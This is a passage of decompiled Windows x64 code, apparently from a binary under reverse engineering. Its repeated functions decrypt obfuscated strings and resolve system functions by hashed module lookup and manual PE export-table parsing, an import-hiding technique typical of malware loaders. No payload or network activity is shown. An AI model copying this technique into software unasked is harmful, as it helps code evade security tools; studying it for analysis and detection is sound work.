    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xe);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_1400097d6;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_1400097d6:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_140009840 @ 140009840 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_140009840(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0xc);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 10);
  uVar13 = *(uint *)(param_2 + 0x1c);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0x1a);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_140009b96;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_140009b96:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_140009c00 @ 140009c00 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_140009c00(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0xc);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 10);
  uVar13 = *(uint *)(param_2 + 0x18);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0x15);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
